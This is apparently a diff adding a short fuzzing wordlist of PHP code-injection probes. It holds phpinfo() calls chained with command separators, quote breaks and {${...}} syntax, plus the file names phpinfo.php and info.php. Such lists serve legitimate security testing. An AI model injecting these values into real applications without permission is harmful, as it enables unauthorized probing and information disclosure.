@@ -1,0 +1,15 @@
+%20{${phpinfo()}}
+phpinfo
+phpinfo.php
+info.php
+|| phpinfo()
+| phpinfo()
+ {${phpinfo()}}
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+& phpinfo()
+&& phpinfo()
+phpinfo()
+phpinfo();
